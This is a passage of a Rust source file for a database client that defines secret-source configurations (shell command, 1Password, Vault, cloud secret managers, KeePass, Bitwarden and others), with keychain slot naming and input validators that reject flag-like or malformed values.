//! Where a connection's secret field takes its value from when it isn't
//! kept in the keychain (docs/secret-sources.md): a command's output, a
//! 1Password reference, HashiCorp Vault, AWS Secrets Manager, Azure Key
//! Vault, Google Secret Manager, a KeePass database, Zoho Vault, Bitwarden,
//! Bitwarden Secrets Manager or AWS Systems Manager Parameter Store.
//!
//! The definition (the command, the `op://` reference, the Vault path…) is
//! not secret: it lives in the connection's options under [`OPTION`], as
//! JSON, and travels with it (cloud backup, export, import). The value it
//! resolves to never does: it's fetched at connect time, kept in memory and
//! handed to the driver (src-tauri/src/secret_sources).
//!
//! A definition runs a program or sends a token somewhere, so one that came
//! from outside this computer (an import, a restored backup) never runs
//! until the user confirms it here. Confirmations are kept in a local file
//! next to the state (never synced nor exported), as digests of
//! (connection, field, definition as the form writes it, see [`canonical`]):
//! any change that does something asks again.

use crate::state::SavedConnection;
use dbine_driver::{ConnectionConfig, Error, Result};
use serde::{Deserialize, Serialize};
use sha2::{Digest, Sha256};
use std::collections::{BTreeMap, BTreeSet};
use std::path::PathBuf;
use std::sync::Mutex;

/// The connection option holding the definitions, by field key.
pub const OPTION: &str = "secret_sources";
/// A Vault token typed in the form is kept in the keychain under this
/// prefix plus the field key (`source_token:password`). Providers that need
/// more than one value add a slot (`source_token:password#refresh_token`);
/// see [`token_key`].
pub const TOKEN_PREFIX: &str = "source_token:";

/// The keychain key of a field's token (`slot` empty: the main one, the
/// Vault token or the master password; else `#slot` after the field).
pub fn token_key(field: &str, slot: &str) -> String {
    if slot.is_empty() {
        format!("{TOKEN_PREFIX}{field}")
    } else {
        format!("{TOKEN_PREFIX}{field}#{slot}")
    }
}

/// `(field, slot)` of a token key, if it is one.
pub fn token_parts(key: &str) -> Option<(&str, &str)> {
    let rest = key.strip_prefix(TOKEN_PREFIX)?;
    Some(rest.split_once('#').unwrap_or((rest, "")))
}

/// Where a KeePass database's master password (or Zoho Vault's master
/// passphrase) comes from.
#[derive(Debug, Clone, Copy, Default, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum MasterSource {
    /// Typed in the form, kept in the keychain (the field's main token).
    #[default]
    Keychain,
    /// Asked when connecting; kept in memory while the connection is open.
    Ask,
    /// The output of `master_command`.
    Command,
    /// No password: the key file alone opens the database (KeePass only).
    None,
}

fn is_keychain(m: &MasterSource) -> bool {
    *m == MasterSource::Keychain
}

/// Zoho's data centres: `(id, accounts host, Vault host)`. Tokens only go
/// to the two hosts of the one chosen.
pub const ZOHO_DATA_CENTERS: &[(&str, &str, &str)] = &[
    ("com", "accounts.zoho.com", "vault.zoho.com"),
    ("eu", "accounts.zoho.eu", "vault.zoho.eu"),
    ("in", "accounts.zoho.in", "vault.zoho.in"),
    ("com.au", "accounts.zoho.com.au", "vault.zoho.com.au"),
    ("jp", "accounts.zoho.jp", "vault.zoho.jp"),
    ("ca", "accounts.zohocloud.ca", "vault.zohocloud.ca"),
    ("sa", "accounts.zoho.sa", "vault.zoho.sa"),
    ("uk", "accounts.zoho.uk", "vault.zoho.uk"),
    ("ae", "accounts.zoho.ae", "vault.zoho.ae"),
    ("sg", "accounts.zoho.sg", "vault.zoho.sg"),
    ("com.cn", "accounts.zoho.com.cn", "vault.zoho.com.cn"),
];

/// The accounts and Vault hosts of a Zoho data centre.
pub fn zoho_hosts(data_center: &str) -> Option<(&'static str, &'static str)> {
    ZOHO_DATA_CENTERS.iter().find(|(id, _, _)| *id == data_center.trim()).map(|(_, a, v)| (*a, *v))
}

/// KV secrets engine version of a Vault path.
#[derive(Debug, Clone, Copy, Default, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum KvVersion {
    /// Asked to Vault (`sys/internal/ui/mounts`), else v2 then v1.
    #[default]
    Auto,
    #[serde(rename = "1")]
    V1,
    #[serde(rename = "2")]
    V2,
}

fn is_false(b: &bool) -> bool {
    !*b
}

fn is_auto(v: &KvVersion) -> bool {
    *v == KvVersion::Auto
}

/// One field's source. "Saved" (the keychain) and "ask every time" aren't
/// here: they are the absence of a definition (`save_password` says which).
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(tag = "kind", rename_all = "snake_case")]
pub enum SecretSource {
    /// A command run with the user's login shell; its output is the secret.
    Command {
        command: String,
        #[serde(default, skip_serializing_if = "String::is_empty")]
        json_key: String,
    },
    /// `op read <reference>` (1Password CLI).
    #[serde(rename = "onepassword")]
    OnePassword {
        reference: String,
        #[serde(default, skip_serializing_if = "String::is_empty")]
        account: String,
        #[serde(default, skip_serializing_if = "String::is_empty")]
        json_key: String,
        /// The connection's user comes from the same item (its `username`
        /// field, or `user_field`: `[section/]field`).
        #[serde(default, skip_serializing_if = "is_false")]
        fill_username: bool,
        /// The entry's field the user comes from (with `fill_username`);
        /// empty: the provider's own user field.
        #[serde(default, skip_serializing_if = "String::is_empty")]
        user_field: String,
        /// The ID of a saved account of this computer for this manager
        /// (crate::secret_accounts): then the sign-in fields above are empty
        /// and the account's are used. Last and left out when empty, so an
        /// inline definition's JSON (and its confirmation) is as before.
        #[serde(default, skip_serializing_if = "String::is_empty")]
        secret_account: String,
    },
    /// A key of a KV secret (v1 or v2).
    Vault {
        #[serde(default, skip_serializing_if = "String::is_empty")]
        address: String,
        path: String,
        key: String,
        #[serde(default, skip_serializing_if = "String::is_empty")]
        namespace: String,
        #[serde(default, skip_serializing_if = "is_auto")]
        kv_version: KvVersion,
        /// PEM file of the CA that signed Vault's certificate.
        #[serde(default, skip_serializing_if = "String::is_empty")]
        ca_file: String,
        /// How DBine signs in to Vault: a token, or AppRole.
        #[serde(default, skip_serializing_if = "is_token_auth")]
        auth: VaultAuth,
        /// AppRole's mount (empty: `approle`).
        #[serde(default, skip_serializing_if = "String::is_empty")]
        approle_mount: String,
        /// AppRole's role ID (not secret; the secret ID is in the keychain).
        #[serde(default, skip_serializing_if = "String::is_empty")]
        role_id: String,
        /// The ID of a saved account of this computer for this manager
        /// (crate::secret_accounts): then the sign-in fields above are empty
        /// and the account's are used. Last and left out when empty, so an
        /// inline definition's JSON (and its confirmation) is as before.
        #[serde(default, skip_serializing_if = "String::is_empty")]
        secret_account: String,
    },
    /// AWS Secrets Manager (`GetSecretValue`).
    Aws {
        secret_id: String,
        #[serde(default, skip_serializing_if = "String::is_empty")]
        region: String,
        #[serde(default, skip_serializing_if = "String::is_empty")]
        profile: String,
        #[serde(default, skip_serializing_if = "String::is_empty")]
        json_key: String,
        /// The connection's user comes from the same secret's `username`.
        #[serde(default, skip_serializing_if = "is_false")]
        fill_username: bool,
        /// The ID of a saved account of this computer for this manager
        /// (crate::secret_accounts): then the sign-in fields above are empty
        /// and the account's are used. Last and left out when empty, so an
        /// inline definition's JSON (and its confirmation) is as before.
        #[serde(default, skip_serializing_if = "String::is_empty")]
        secret_account: String,
    },
    /// Azure Key Vault.
    Azure {
        #[serde(default, skip_serializing_if = "String::is_empty")]
        vault_url: String,
        name: String,
        #[serde(default, skip_serializing_if = "String::is_empty")]
        version: String,
        #[serde(default, skip_serializing_if = "String::is_empty")]
        json_key: String,
        /// The Microsoft Entra tenant the token is asked for (an ID or a
        /// domain); empty: the CLI's current one.
        #[serde(default, skip_serializing_if = "String::is_empty")]
        tenant: String,
        /// The ID of a saved account of this computer for this manager
        /// (crate::secret_accounts): then the sign-in fields above are empty
        /// and the account's are used. Last and left out when empty, so an
        /// inline definition's JSON (and its confirmation) is as before.
        #[serde(default, skip_serializing_if = "String::is_empty")]
        secret_account: String,
    },
    /// Google Secret Manager.
    Gcp {
        #[serde(default, skip_serializing_if = "String::is_empty")]
        project: String,
        secret: String,
        /// Empty: `latest`.
        #[serde(default, skip_serializing_if = "String::is_empty")]
        version: String,
        #[serde(default, skip_serializing_if = "String::is_empty")]
        json_key: String,
        /// The gcloud account the token is asked for (`--account`, an
        /// e-mail); empty: gcloud's active one (and the rest of the chain).
        /// Left out when empty, so an inline definition's JSON (and its
        /// confirmation) is as before.
        #[serde(default, skip_serializing_if = "String::is_empty")]
        account: String,
        /// The ID of a saved account of this computer for this manager
        /// (crate::secret_accounts): then the sign-in fields above are empty
        /// and the account's are used. Last and left out when empty, so an
        /// inline definition's JSON (and its confirmation) is as before.
        #[serde(default, skip_serializing_if = "String::is_empty")]
        secret_account: String,
    },
    /// An entry of a KeePass database (.kdbx), read here.
    #[serde(rename = "keepass")]
    KeePass {
        /// The .kdbx file (`~/` is the home folder).
        #[serde(default, skip_serializing_if = "String::is_empty")]
        file: String,
        /// `Group/Subgroup/Title`, a title alone, or the entry's UUID.
        entry: String,
        /// The entry's field; empty: `Password`.
        #[serde(default, skip_serializing_if = "String::is_empty")]
        attribute: String,
        #[serde(default, skip_serializing_if = "String::is_empty")]
        key_file: String,
        #[serde(default, skip_serializing_if = "is_keychain")]
        master: MasterSource,
        /// With `master: command`, the command that prints the password.
        #[serde(default, skip_serializing_if = "String::is_empty")]
        master_command: String,
        /// The connection's user comes from the entry's `UserName`.
        #[serde(default, skip_serializing_if = "is_false")]
        fill_username: bool,
        /// The entry's field the user comes from (with `fill_username`);
        /// empty: the provider's own user field.
        #[serde(default, skip_serializing_if = "String::is_empty")]
        user_field: String,
        /// The ID of a saved account of this computer for this manager
        /// (crate::secret_accounts): then the sign-in fields above are empty
        /// and the account's are used. Last and left out when empty, so an
        /// inline definition's JSON (and its confirmation) is as before.
        #[serde(default, skip_serializing_if = "String::is_empty")]
        secret_account: String,
    },
    /// A secret of Zoho Vault: its REST API with an OAuth self client, the
    /// values decrypted here with the master passphrase. Either through a
    /// saved account of this computer (`account`, crate::secret_accounts:
    /// the sign-in and the passphrase are the account's), or with the
    /// sign-in inline ("manual" mode: `data_center`, `client_id`, `master`,
    /// the client secret and refresh token kept for the field). Inline
    /// definitions are written exactly as before `account` existed.
    Zoho {
        /// `com`, `eu`, `in`… ([`ZOHO_DATA_CENTERS`]); empty with an account.
        #[serde(default, skip_serializing_if = "String::is_empty")]
        data_center: String,
        /// The secret's name, or its ID.
        secret_name: String,
        /// The secret's field; empty: `password`.
        #[serde(default, skip_serializing_if = "String::is_empty")]
        attribute: String,
        /// The self client's ID (not secret; its secret and the refresh
        /// token are in the keychain); empty with an account.
        #[serde(default, skip_serializing_if = "String::is_empty")]
        client_id: String,
        #[serde(default, skip_serializing_if = "is_keychain")]
        master: MasterSource,
        #[serde(default, skip_serializing_if = "String::is_empty")]
        master_command: String,
        /// The connection's user comes from the secret's `username`.
        #[serde(default, skip_serializing_if = "is_false")]
        fill_username: bool,
        /// The entry's field the user comes from (with `fill_username`);
        /// empty: the provider's own user field.
        #[serde(default, skip_serializing_if = "String::is_empty")]
        user_field: String,
        /// The ID of a Zoho account saved on this computer
        /// (crate::secret_accounts); empty: the inline sign-in above. Last,
        /// so an inline definition's JSON (and its confirmation) is as before.
        #[serde(default, skip_serializing_if = "String::is_empty")]
        account: String,
    },
    /// HashiCorp Vault's database secrets engine: a user and a password
    /// made for this connection (`<mount>/creds/<role>`), or a static
    /// role's (`<mount>/static-creds/<role>`). Fills the user too.
    #[serde(rename = "vault_db")]
    VaultDb {
        #[serde(default, skip_serializing_if = "String::is_empty")]
        address: String,
        /// The engine's mount (empty: `database`).
        #[serde(default, skip_serializing_if = "String::is_empty")]
        mount: String,
        role: String,
        #[serde(default, skip_serializing_if = "is_false")]
        static_role: bool,
        #[serde(default, skip_serializing_if = "String::is_empty")]
        namespace: String,
        #[serde(default, skip_serializing_if = "String::is_empty")]
        ca_file: String,
        #[serde(default, skip_serializing_if = "is_token_auth")]
        auth: VaultAuth,
        #[serde(default, skip_serializing_if = "String::is_empty")]
        approle_mount: String,
        #[serde(default, skip_serializing_if = "String::is_empty")]
        role_id: String,
        /// The ID of a saved account of this computer for this manager
        /// (crate::secret_accounts): then the sign-in fields above are empty
        /// and the account's are used. Last and left out when empty, so an
        /// inline definition's JSON (and its confirmation) is as before.
        #[serde(default, skip_serializing_if = "String::is_empty")]
        secret_account: String,
    },
    /// CyberArk Conjur (Open Source, Enterprise, Conjur Cloud): a variable,
    /// with a host's or user's API key (in the keychain).
    Conjur {
        /// The appliance URL (Conjur Cloud: `https://<subdomain>.secretsmgr.cyberark.cloud/api`).
        #[serde(default, skip_serializing_if = "String::is_empty")]
        url: String,
        #[serde(rename = "conjur_account", default, skip_serializing_if = "String::is_empty")]
        account: String,
        /// `host/<id>` or a user name.
        #[serde(default, skip_serializing_if = "String::is_empty")]
        login: String,
        variable: String,
        /// Another variable with the connection's user.
        #[serde(default, skip_serializing_if = "String::is_empty")]
        username_variable: String,
        #[serde(default, skip_serializing_if = "String::is_empty")]
        json_key: String,
        #[serde(default, skip_serializing_if = "String::is_empty")]
        ca_file: String,
        /// The ID of a saved account of this computer for this manager
        /// (crate::secret_accounts): then the sign-in fields above are empty
        /// and the account's are used. Last and left out when empty, so an
        /// inline definition's JSON (and its confirmation) is as before.
        #[serde(default, skip_serializing_if = "String::is_empty")]
        secret_account: String,
    },
    /// CyberArk's Central Credential Provider (`/AIMWebService/api/Accounts`),
    /// usually with a client certificate.
    Ccp {
        #[serde(default, skip_serializing_if = "String::is_empty")]
        url: String,
        #[serde(default, skip_serializing_if = "String::is_empty")]
        app_id: String,
        #[serde(default, skip_serializing_if = "String::is_empty")]
        safe: String,
        #[serde(default, skip_serializing_if = "String::is_empty")]
        folder: String,
        #[serde(default, skip_serializing_if = "String::is_empty")]
        object: String,
        /// The account's `UserName` (a query, with or instead of `object`).
        #[serde(default, skip_serializing_if = "String::is_empty")]
        account_user: String,
        /// The account's `Address`.
        #[serde(default, skip_serializing_if = "String::is_empty")]
        account_address: String,
        /// PEM certificate (with or without its key), or a PKCS#12 file.
        #[serde(default, skip_serializing_if = "String::is_empty")]
        client_cert: String,
        /// PEM private key, when it isn't in `client_cert`.
        #[serde(default, skip_serializing_if = "String::is_empty")]
        client_key: String,
        #[serde(default, skip_serializing_if = "String::is_empty")]
        ca_file: String,
        /// The connection's user comes from the account's `UserName`.
        #[serde(default, skip_serializing_if = "is_false")]
        fill_username: bool,
        /// The ID of a saved account of this computer for this manager
        /// (crate::secret_accounts): then the sign-in fields above are empty
        /// and the account's are used. Last and left out when empty, so an
        /// inline definition's JSON (and its confirmation) is as before.
        #[serde(default, skip_serializing_if = "String::is_empty")]
        secret_account: String,
    },
    /// Delinea Secret Server (on premises or Secret Server Cloud), signed in
    /// with OAuth2; with Delinea Platform, the token comes from the
    /// platform's tenant.
    Delinea {
        /// Secret Server's URL (`https://<tenant>.secretservercloud.com`,
        /// `https://ss.example.com/SecretServer`).
        #[serde(default, skip_serializing_if = "String::is_empty")]
        url: String,
        /// `https://<tenant>.delinea.app`: sign in there with a service
        /// user's client ID (`username`) and secret.
        #[serde(default, skip_serializing_if = "String::is_empty")]
        platform_url: String,
        #[serde(default, skip_serializing_if = "String::is_empty")]
        username: String,
        #[serde(default, skip_serializing_if = "String::is_empty")]
        domain: String,
        /// The secret's ID or name.
        secret_name: String,
        /// The field's slug; empty: `password`.
        #[serde(default, skip_serializing_if = "String::is_empty")]
        attribute: String,
        /// Where the password (or the client secret) comes from.
        #[serde(default, skip_serializing_if = "is_keychain")]
        master: MasterSource,
        #[serde(default, skip_serializing_if = "String::is_empty")]
        master_command: String,
        /// The connection's user comes from the secret's `username` field.
        #[serde(default, skip_serializing_if = "is_false")]
        fill_username: bool,
        /// The entry's field the user comes from (with `fill_username`);
        /// empty: the provider's own user field.
        #[serde(default, skip_serializing_if = "String::is_empty")]
        user_field: String,
        /// The ID of a saved account of this computer for this manager
        /// (crate::secret_accounts): then the sign-in fields above are empty
        /// and the account's are used. Last and left out when empty, so an
        /// inline definition's JSON (and its confirmation) is as before.
        #[serde(default, skip_serializing_if = "String::is_empty")]
        secret_account: String,
    },
    /// A field of an item of a Bitwarden vault (personal or an
    /// organization's): its API with a personal API key, the vault
    /// decrypted here with the master password.
    Bitwarden {
        /// `bitwarden.com` (also empty), `bitwarden.eu` or a self-hosted
        /// server's URL ([`bitwarden_urls`]).
        #[serde(default)]
        server: String,
        /// The item's ID, or its exact name.
        item: String,
        /// `password` (empty), `username`, `notes` or a custom field's name.
        #[serde(default, skip_serializing_if = "String::is_empty")]
        attribute: String,
        #[serde(default, skip_serializing_if = "String::is_empty")]
        json_key: String,
        /// The API key's `client_id` (`user.<uuid>`; not secret: its
        /// `client_secret` is in the keychain).
        #[serde(default, skip_serializing_if = "String::is_empty")]
        client_id: String,
        #[serde(default, skip_serializing_if = "is_keychain")]
        master: MasterSource,
        #[serde(default, skip_serializing_if = "String::is_empty")]
        master_command: String,
        /// The connection's user comes from the item's username.
        #[serde(default, skip_serializing_if = "is_false")]
        fill_username: bool,
        /// The entry's field the user comes from (with `fill_username`);
        /// empty: the provider's own user field.
        #[serde(default, skip_serializing_if = "String::is_empty")]
        user_field: String,
        /// The ID of a saved account of this computer for this manager
        /// (crate::secret_accounts): then the sign-in fields above are empty
        /// and the account's are used. Last and left out when empty, so an
        /// inline definition's JSON (and its confirmation) is as before.
        #[serde(default, skip_serializing_if = "String::is_empty")]
        secret_account: String,
    },
    /// A secret of Bitwarden Secrets Manager, with a machine account's
    /// access token (in the keychain, else `BWS_ACCESS_TOKEN`).
    BitwardenSm {
        #[serde(default)]
        server: String,
        /// The secret's ID (a UUID).
        secret: String,
        #[serde(default, skip_serializing_if = "String::is_empty")]
        json_key: String,
        /// The ID of a saved account of this computer for this manager
        /// (crate::secret_accounts): then the sign-in fields above are empty
        /// and the account's are used. Last and left out when empty, so an
        /// inline definition's JSON (and its confirmation) is as before.
        #[serde(default, skip_serializing_if = "String::is_empty")]
        secret_account: String,
    },
    /// AWS Systems Manager Parameter Store (`GetParameter`, decrypted).
    Ssm {
        /// The parameter's name (`/prod/db/password`) or ARN.
        parameter: String,
        /// A version number or a label; empty: the latest.
        #[serde(default, skip_serializing_if = "String::is_empty")]
        version: String,
        #[serde(default, skip_serializing_if = "String::is_empty")]
        region: String,
        #[serde(default, skip_serializing_if = "String::is_empty")]
        profile: String,
        /// For a `StringList`, which element (1 is the first).
        #[serde(default, skip_serializing_if = "String::is_empty")]
        list_index: String,
        #[serde(default, skip_serializing_if = "String::is_empty")]
        json_key: String,
        /// The connection's user comes from the value's `username` key.
        #[serde(default, skip_serializing_if = "is_false")]
        fill_username: bool,
        /// The ID of a saved account of this computer for this manager
        /// (crate::secret_accounts): then the sign-in fields above are empty
        /// and the account's are used. Last and left out when empty, so an
        /// inline definition's JSON (and its confirmation) is as before.
        #[serde(default, skip_serializing_if = "String::is_empty")]
        secret_account: String,
    },
}

pub type SecretSources = BTreeMap<String, SecretSource>;

fn bad(msg: impl Into<String>) -> Error {
    Error::State(msg.into())
}

/// Azure Key Vault's DNS suffixes and the token resource of each cloud.
pub const AZURE_VAULT_SUFFIXES: &[(&str, &str)] = &[
    (".vault.azure.net", "https://vault.azure.net"),
    (".vault.azure.cn", "https://vault.azure.cn"),
    (".vault.usgovcloudapi.net", "https://vault.usgovcloudapi.net"),
    (".vault.microsoftazure.de", "https://vault.microsoftazure.de"),
];

/// `https://<name>.vault.azure.net` (or another cloud's suffix), with no
/// path, query or credentials: the host and the token's resource.
pub fn azure_vault_host(url: &str) -> Option<(String, &'static str)> {
    let host = url.trim().strip_prefix("https://")?.trim_end_matches('/');
    if host.is_empty() || !host.chars().all(|c| c.is_ascii_alphanumeric() || c == '-' || c == '.') {
        return None;
    }
    let host = host.to_ascii_lowercase();
    AZURE_VAULT_SUFFIXES.iter().find_map(|(suffix, resource)| {
        let name = host.strip_suffix(suffix)?;
        (!name.is_empty() && name.chars().all(|c| c.is_ascii_alphanumeric() || c == '-')).then(|| (host.clone(), *resource))
    })
}

/// A name that goes in a cloud API's URL path as is.
pub(crate) fn url_segment(s: &str) -> bool {
    !s.is_empty() && s.len() <= 255 && s.chars().all(|c| c.is_ascii_alphanumeric() || matches!(c, '-' | '_' | '.' | ':'))
}

/// A Microsoft Entra tenant: its ID (a GUID) or a domain
/// (`contoso.onmicrosoft.com`); it goes to `az` as an argument.
pub fn valid_azure_tenant(t: &str) -> bool {
    !t.is_empty() && t.len() <= 255 && !t.starts_with(['-', '.']) && t.chars().all(|c| c.is_ascii_alphanumeric() || matches!(c, '-' | '.'))
}

/// A gcloud account (an e-mail: a user's or a service account's), as it
/// goes to `gcloud --account`: nothing that reads as a flag.
pub fn valid_gcloud_account(a: &str) -> bool {
    let Some((user, domain)) = a.split_once('@') else { return false };
    a.len() <= 254
        && !user.is_empty()
        && !user.starts_with(['-', '.'])
        && domain.contains('.')
        && !domain.starts_with(['-', '.'])
        && !domain.ends_with('.')
        && !domain.contains('@')
        && a.chars().all(|c| c.is_ascii_alphanumeric() || matches!(c, '-' | '.' | '_' | '+' | '@'))
}

/// An AWS profile's name as DBine passes it on (nothing that reads as a flag).
pub fn valid_aws_profile(p: &str) -> bool {
    !p.is_empty() && p.len() <= 128 && !p.starts_with('-') && p.chars().all(|c| c.is_ascii_alphanumeric() || matches!(c, '-' | '.' | '_' | '@' | '+'))
}

/// `us-east-1`, `eu-central-2`, `cn-north-1`…
pub fn valid_aws_region(r: &str) -> bool {
    let parts: Vec<&str> = r.split('-').collect();
    parts.len() >= 3
        && parts.iter().all(|p| !p.is_empty() && p.chars().all(|c| c.is_ascii_lowercase() || c.is_ascii_digit()))
        && parts.last().is_some_and(|p| p.chars().all(|c| c.is_ascii_digit()))
}

/// The kind of saved account (crate::secret_accounts) a kind of definition
/// signs in with: Vault's KV and database credentials share one, and so do
/// AWS Secrets Manager and Parameter Store.
pub fn account_kind_of(source_kind: &str) -> Option<&'static str> {
    Some(match source_kind {
        "zoho" => "zoho",
        "bitwarden" => "bitwarden",
        "bitwarden_sm" => "bitwarden_sm",
        "vault" | "vault_db" => "vault",
        "delinea" => "delinea",
        "conjur" => "conjur",
        "ccp" => "ccp",
        "onepassword" => "onepassword",
        "aws" | "ssm" => "aws",
        "azure" => "azure",
        "gcp" => "gcp",
        "keepass" => "keepass",
        _ => return None,
    })
}

impl SecretSource {
    /// The kind, as stored (`command`, `onepassword`, `vault`…).
    pub fn kind(&self) -> &'static str {
        match self {
            Self::Command { .. } => "command",
            Self::OnePassword { .. } => "onepassword",
            Self::Vault { .. } => "vault",
            Self::Aws { .. } => "aws",
            Self::Azure { .. } => "azure",
            Self::Gcp { .. } => "gcp",
            Self::KeePass { .. } => "keepass",
            Self::Zoho { .. } => "zoho",
            Self::VaultDb { .. } => "vault_db",
            Self::Conjur { .. } => "conjur",
            Self::Ccp { .. } => "ccp",
            Self::Delinea { .. } => "delinea",
            Self::Bitwarden { .. } => "bitwarden",
            Self::BitwardenSm { .. } => "bitwarden_sm",
            Self::Ssm { .. } => "ssm",
        }
    }

    /// The token slots kept in the keychain for this definition ("": the
    /// main one). A master password asked or taken from a command isn't.
    pub fn token_slots(&self) -> &'static [&'static str] {
        // Through an account: the account keeps them (crate::secret_accounts).
        if self.account().is_some() {
            return &[];
        }
        match self {
            Self::Vault { auth: VaultAuth::Approle, .. } | Self::VaultDb { auth: VaultAuth::Approle, .. } => &["secret_id"],
            Self::Vault { .. } | Self::KeePass { master: MasterSource::Keychain, .. } => &[""],
            Self::Zoho { master: MasterSource::Keychain, .. } => &["", "client_secret", "refresh_token"],
            Self::Zoho { .. } => &["client_secret", "refresh_token"],
            Self::VaultDb { .. } | Self::Conjur { .. } | Self::Ccp { .. } | Self::Delinea { master: MasterSource::Keychain, .. } => &[""],
            Self::Bitwarden { master: MasterSource::Keychain, .. } => &["", "client_secret"],
            Self::Bitwarden { .. } => &["client_secret"],
            Self::BitwardenSm { .. } => &[""],
            _ => &[],
        }
    }

    /// Where the master password comes from (KeePass, Zoho Vault, Bitwarden).
    pub fn master(&self) -> Option<MasterSource> {
        // Through an account: the account's (crate::secret_accounts).
        if self.account().is_some() {
            return None;
        }
        match self {
            Self::KeePass { master, .. } | Self::Zoho { master, .. } | Self::Delinea { master, .. } | Self::Bitwarden { master, .. } => Some(*master),
            _ => None,
        }
    }

    /// The saved account (crate::secret_accounts) the definition signs in
    /// with, if any: Zoho Vault's `account`, the others' `secret_account`.
    pub fn account(&self) -> Option<&str> {
        let id = match self {
            Self::Zoho { account, .. } => account,
            Self::OnePassword { secret_account, .. }
            | Self::Vault { secret_account, .. }
            | Self::Aws { secret_account, .. }
            | Self::Azure { secret_account, .. }
            | Self::Gcp { secret_account, .. }
            | Self::KeePass { secret_account, .. }
            | Self::VaultDb { secret_account, .. }
            | Self::Conjur { secret_account, .. }
            | Self::Ccp { secret_account, .. }
            | Self::Delinea { secret_account, .. }
            | Self::Bitwarden { secret_account, .. }
            | Self::BitwardenSm { secret_account, .. }
            | Self::Ssm { secret_account, .. } => secret_account,
            Self::Command { .. } => return None,
        };
        Some(id.as_str()).filter(|i| !i.is_empty())
    }

    /// The saved account a Zoho Vault definition signs in with, if any.
    pub fn zoho_account(&self) -> Option<&str> {
        match self {
            Self::Zoho { .. } => self.account(),
            _ => None,
        }
    }

    /// The kind of account (crate::secret_accounts::AccountConfig::kind)
    /// this kind of definition signs in with; `None`: it has none (a command).
    pub fn account_kind(&self) -> Option<&'static str> {
        account_kind_of(self.kind())
    }

    /// With an account, whether the definition also carries a sign-in of
    /// its own (it mustn't: the account's is used).
    fn has_inline_sign_in(&self) -> bool {
        let any = |v: &[&String]| v.iter().any(|s| !s.is_empty());
        match self {
            Self::Command { .. } | Self::Zoho { .. } => false,
            Self::OnePassword { account, .. } => !account.is_empty(),
            Self::Vault { address, namespace, ca_file, auth, approle_mount, role_id, .. } | Self::VaultDb { address, namespace, ca_file, auth, approle_mount, role_id, .. } => {
                any(&[address, namespace, ca_file, approle_mount, role_id]) || *auth != VaultAuth::Token
            }
            Self::Aws { region, profile, .. } | Self::Ssm { region, profile, .. } => any(&[region, profile]),
            Self::Azure { vault_url, tenant, .. } => any(&[vault_url, tenant]),
            Self::Gcp { project, account, .. } => !project.is_empty() || !account.is_empty(),
            Self::KeePass { file, key_file, master, master_command, .. } => any(&[file, key_file, master_command]) || *master != MasterSource::Keychain,
            Self::Conjur { url, account, login, ca_file, .. } => any(&[url, account, login, ca_file]),
            Self::Ccp { url, app_id, client_cert, client_key, ca_file, .. } => any(&[url, app_id, client_cert, client_key, ca_file]),
            Self::Delinea { url, platform_url, username, domain, master, master_command, .. } => any(&[url, platform_url, username, domain, master_command]) || *master != MasterSource::Keychain,
            Self::Bitwarden { server, client_id, master, master_command, .. } => any(&[server, client_id, master_command]) || *master != MasterSource::Keychain,
            Self::BitwardenSm { server, .. } => !server.is_empty(),
        }
    }

    /// An account definition with a well-formed stand-in for the sign-in
    /// it leaves to the account, to check the rest as an inline one.
    fn with_stand_in_sign_in(&self) -> SecretSource {
        const URL: &str = "https://account.invalid";
        let mut s = self.clone();
        match &mut s {
            Self::Vault { address, secret_account, .. } | Self::VaultDb { address, secret_account, .. } => {
                *address = URL.into();
                secret_account.clear();
            }
            Self::Azure { vault_url, secret_account, .. } => {
                *vault_url = "https://account.vault.azure.net".into();
                secret_account.clear();
            }
            Self::Gcp { project, secret_account, .. } => {
                *project = "account".into();
                secret_account.clear();
            }
            Self::KeePass { file, secret_account, .. } => {
                *file = "account.kdbx".into();
                secret_account.clear();
            }
            Self::Conjur { url, account, login, secret_account, .. } => {
                *url = URL.into();
                *account = "account".into();
                *login = "account".into();
                secret_account.clear();
            }
            Self::Ccp { url, app_id, secret_account, .. } => {
                *url = URL.into();
                *app_id = "account".into();
                secret_account.clear();
            }
            Self::Delinea { url, username, secret_account, .. } => {
                *url = URL.into();
                *username = "account".into();
                secret_account.clear();
            }
            Self::Bitwarden { client_id, secret_account, .. } => {
                *client_id = "user.00000000-0000-4000-8000-000000000000".into();
                secret_account.clear();
            }
            Self::OnePassword { secret_account, .. } | Self::Aws { secret_account, .. } | Self::Ssm { secret_account, .. } | Self::BitwardenSm { secret_account, .. } => secret_account.clear(),
            Self::Command { .. } | Self::Zoho { .. } => {}
        }
        s
    }

    /// The entry's field the user comes from; empty: the provider's own
    /// (KeePass `UserName`, `username` elsewhere).
    pub fn user_field(&self) -> &str {
        match self {
            Self::OnePassword { user_field, .. } | Self::KeePass { user_field, .. } | Self::Zoho { user_field, .. } | Self::Delinea { user_field, .. } | Self::Bitwarden { user_field, .. } => user_field.trim(),
            _ => "",
        }
    }

    /// The JSON key to take from the secret (empty: the whole value).
    pub fn json_key(&self) -> &str {
        match self {
            Self::Command { json_key, .. }
            | Self::OnePassword { json_key, .. }
            | Self::Aws { json_key, .. }
            | Self::Azure { json_key, .. }
            | Self::Gcp { json_key, .. }
            | Self::Conjur { json_key, .. }
            | Self::Bitwarden { json_key, .. }
            | Self::BitwardenSm { json_key, .. }
            | Self::Ssm { json_key, .. } => json_key.trim(),
            Self::Vault { .. } | Self::KeePass { .. } | Self::Zoho { .. } | Self::VaultDb { .. } | Self::Ccp { .. } | Self::Delinea { .. } => "",
        }
    }

    /// Everything the definition needs, well formed. Says what's wrong.
    pub fn validate(&self) -> Result<()> {
        let no_control = |s: &str| !s.chars().any(|c| c.is_control() && c != '\t');
        if !no_control(self.user_field()) || self.user_field().len() > 256 {
            return Err(bad("el campo del usuario no es válido"));
        }
        if let (Some(id), false) = (self.account(), matches!(self, Self::Zoho { .. })) {
            if !crate::secret_accounts::valid_account_id(id) {
                return Err(bad("la cuenta guardada del gestor de secretos no es válida"));
            }
            // The sign-in is the account's.
            if self.has_inline_sign_in() {
                return Err(bad("con una cuenta guardada, el servidor, la identidad y las credenciales son los de la cuenta"));
            }
            return self.with_stand_in_sign_in().validate();
        }
        match self {
            Self::Command { command, .. } => {
                if command.trim().is_empty() {
                    return Err(bad("falta el comando que devuelve el secreto"));
                }
                if command.contains('\0') || command.contains(['\n', '\r']) {
